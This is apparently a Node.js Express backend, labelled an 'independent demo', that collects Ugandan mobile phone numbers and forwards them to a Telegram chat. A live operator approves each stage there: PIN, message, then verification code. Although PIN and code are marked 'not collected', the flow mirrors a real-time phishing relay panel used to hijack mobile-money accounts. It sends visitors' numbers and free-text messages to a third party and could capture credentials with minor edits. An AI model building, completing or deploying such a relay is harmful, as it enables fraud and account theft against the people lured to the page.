const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));

// Serve static files from public/
app.use(express.static(PUBLIC_DIR));

// Explicit homepage route
app.get("/", (req, res) => {
  res.sendFile(INDEX_FILE, (err) => {
    if (err) {
      console.error("Homepage error:", err.message);

      if (!res.headersSent) {
        res.status(404).send(
          "Homepage not found. Check that public/index.html exists."
        );
      }
    }
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const requests = new Map();

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error("Telegram environment variables are missing.");
  }

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }
  );

  const result = await response.json();

  if (!response.ok || !result.ok) {
    throw new Error(
      result.description || "Telegram request failed."
    );
  }

  return result;
}

function timestamp() {
  return new Date().toISOString();
}

async function notify(request, text, buttons = true) {
  const keyboard = buttons
    ? {
        inline_keyboard: [[
          {
            text: "Approve demo",
            callback_data: `approve:${request.id}`
          },
          {
            text: "Decline demo",
            callback_data: `decline:${request.id}`
          }
        ]]
      }
    : undefined;

  const payload = {
    chat_id: CHAT_ID,
    text,
    ...(keyboard ? { reply_markup: keyboard } : {})
  };

  return telegram("sendMessage", payload);
}

// Health check
app.get("/api/health", (_req, res) => {
  res.json({
    ok: true,
    service: "Independent demo"
  });
});

// Create a demo request
app.post("/api/phone", async (req, res) => {
  const phone = String(req.body.phone || "");

  if (!/^\+2567\d{8}$/.test(phone)) {
    return res.status(400).json({
      error: "Enter a valid demo phone number."
    });
  }

  const request = {
    id: crypto.randomUUID(),
    phone,
    stage: "pin-demo",
    status: "pending",
    createdAt: timestamp()
  };

  requests.set(request.id, request);

  try {
    await notify(
      request,
      [
        "INDEPENDENT DEMO",
        `Request: ${request.id}`,
        `Demo phone: ${phone}`,
        "Stage: Dummy PIN demonstration",
        "PIN digits: Not collected",
        `Date/time: ${request.createdAt}`,
        "Status: PENDING"
      ].join("\n")
    );

    res.json({
      id: request.id,
      status: request.status
    });
  } catch (error) {
    console.error(
      "Telegram notification failed:",
      error.message
    );

    res.status(502).json({
      error: "Could not send the demo notification."
    });
  }
});

// Submit a non-sensitive demo message
app.post("/api/message", async (req, res) => {
  const id = String(req.body.id || "");
  const message = String(req.body.message || "").trim();
  const request = requests.get(id);

  if (
    !request ||
    request.stage !== "message" ||
    request.status !== "approved"
  ) {
    return res.status(400).json({
      error: "The message stage is not available."
    });
  }

  if (!message || message.length > 1000) {
    return res.status(400).json({
      error: "Enter a message of 1–1000 characters."
    });
  }

  request.message = message;
  request.stage = "message-review";
  request.status = "pending";
  request.createdAt = timestamp();

  try {
    await notify(
      request,
      [
        "INDEPENDENT DEMO — MESSAGE",
        `Request: ${request.id}`,
        `Date/time: ${request.createdAt}`,
        "",
        "Submitted message:",
        message,
        "",
        "Status: PENDING"
      ].join("\n")
    );

    res.json({
      status: "pending"
    });
  } catch (error) {
    console.error(
      "Telegram message failed:",
      error.message
    );

    res.status(502).json({
      error: "Could not submit the demo message."
    });
  }
});

// Demo code stage: never read or transmit the code
app.post("/api/demo-code", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);

  if (
    !request ||
    request.stage !== "demo-code" ||
    request.status !== "approved"
  ) {
    return res.status(400).json({
      error: "The demo-code stage is not available."
    });
  }

  request.stage = "code-review";
  request.status = "pending";
  request.createdAt = timestamp();

  try {
    await notify(
      request,
      [
        "INDEPENDENT DEMO — CODE STAGE",
        `Request: ${request.id}`,
        `Date/time: ${request.createdAt}`,
        "Demo code entered: Not collected",
        "Status: PENDING"
      ].join("\n")
    );

    res.json({
      status: "pending"
    });
  } catch (error) {
    console.error(
      "Telegram code-stage notification failed:",
      error.message
    );

    res.status(502).json({
      error: "Could not send the demo status."
    });
  }
});

// Telegram approval polling.
// Only one running instance should poll this bot.
let polling = false;
let offset = 0;

async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID || polling) {
    return;
  }

  polling = true;

  while (true) {
    try {
      const result = await telegram("getUpdates", {
        offset,
        timeout: 25,
        allowed_updates: ["callback_query"]
      });

      for (const update of result.result || []) {
        offset = update.update_id + 1;

        const callback = update.callback_query;

        if (!callback) {
          continue;
        }

        const [action, id] = String(
          callback.data || ""
        ).split(":");

        const request = requests.get(id);

        if (
          !request ||
          !["approve", "decline"].includes(action)
        ) {
          await telegram("answerCallbackQuery", {
            callback_query_id: callback.id,
            text: "This demo request is unavailable."
          });

          continue;
        }

        if (action === "approve") {
          request.status = "approved";

          if (request.stage === "pin-demo") {
            request.stage = "message";
          } else if (
            request.stage === "message-review"
          ) {
            request.stage = "demo-code";
          } else if (
            request.stage === "code-review"
          ) {
            request.stage = "success";
          }
        } else {
          request.status = "declined";
        }

        request.updatedAt = timestamp();

        await telegram("answerCallbackQuery", {
          callback_query_id: callback.id,
          text: action === "approve"
            ? "Demo approved"
            : "Demo declined"
        });

        if (callback.message) {
          await telegram("editMessageReplyMarkup", {
            chat_id: CHAT_ID,
            message_id: callback.message.message_id,
            reply_markup: {
              inline_keyboard: []
            }
          });
        }

        await telegram("sendMessage", {
          chat_id: CHAT_ID,
          text: [
            "DEMO STATUS UPDATED",
            `Request: ${request.id}`,
            `Status: ${request.status.toUpperCase()}`,
            `Stage: ${request.stage}`,
            `Date/time: ${request.updatedAt}`
          ].join("\n")
        });
      }
    } catch (error) {
      console.error(
        "Telegram polling error:",
        error.message
      );

      await new Promise(resolve => {
        setTimeout(resolve, 3000);
      });
    }
  }
}

// Request status
app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      error: "Demo request not found."
    });
  }

  res.json({
    stage: request.stage,
    status: request.status,
    updatedAt: request.updatedAt || null
  });
});

// Start server
app.listen(PORT, () => {
  console.log(
    `Independent demo running on port ${PORT}`
  );

  console.log(
    `Serving homepage from ${INDEX_FILE}`
  );

  pollTelegram();
});
